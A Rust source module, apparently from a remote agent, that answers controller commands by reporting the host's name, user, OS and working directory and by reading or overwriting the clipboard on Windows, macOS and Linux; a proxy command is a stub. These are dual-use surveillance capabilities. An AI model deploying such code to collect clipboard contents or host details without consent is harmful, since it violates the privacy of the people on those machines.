use crate::support::{
    current_dir_label, hostname, join_sections, run_command, run_command_with_stdin,
    run_first_available, run_first_available_with_stdin, run_powershell, run_powershell_with_stdin,
    truncate_chars, username,
};
use rdl_protocol::CommandKind;

pub fn handle(command: &CommandKind, payload: &str) -> String {
    match command {
        CommandKind::ComputerInfo => computer_info(),
        CommandKind::Clipboard => clipboard_command(payload),
        CommandKind::Proxy => format!("TODO: {} accepted as planned stub", command.as_str()),
        _ => unreachable!("system_info received non-system command"),
    }
}

fn computer_info() -> String {
    join_sections(
        "computer_info",
        vec![
            format!("hostname={}", hostname()),
            format!("user={}", username()),
            format!("os={}", std::env::consts::OS),
            format!("arch={}", std::env::consts::ARCH),
            format!("current_dir={}", current_dir_label()),
        ],
    )
}

fn clipboard_command(payload: &str) -> String {
    let trimmed = payload.trim();
    if let Some(value) = trimmed
        .strip_prefix("write:")
        .or_else(|| trimmed.strip_prefix("set:"))
    {
        return write_clipboard(value.trim_start());
    }
    if trimmed.eq_ignore_ascii_case("write") || trimmed.eq_ignore_ascii_case("set") {
        return "clipboard write requires payload: write:<text>".to_string();
    }
    read_clipboard()
}

fn read_clipboard() -> String {
    let result = if cfg!(target_os = "windows") {
        run_powershell("Get-Clipboard", 40)
    } else if cfg!(target_os = "macos") {
        run_command("pbpaste", &[], 40)
    } else {
        run_first_available(
            &[
                ("wl-paste", &[][..]),
                ("xclip", &["-selection", "clipboard", "-o"][..]),
                ("xsel", &["--clipboard", "--output"][..]),
            ],
            40,
        )
    };
    format!("clipboard read:\n{}", truncate_chars(&result, 4_000))
}

fn write_clipboard(value: &str) -> String {
    if cfg!(target_os = "windows") {
        return run_powershell_with_stdin("$input | Set-Clipboard", value, 20);
    }
    if cfg!(target_os = "macos") {
        return run_command_with_stdin("pbcopy", &[], value, 20);
    }
    run_first_available_with_stdin(
        &[
            ("wl-copy", &[][..]),
            ("xclip", &["-selection", "clipboard"][..]),
            ("xsel", &["--clipboard", "--input"][..]),
        ],
        value,
        20,
    )
}
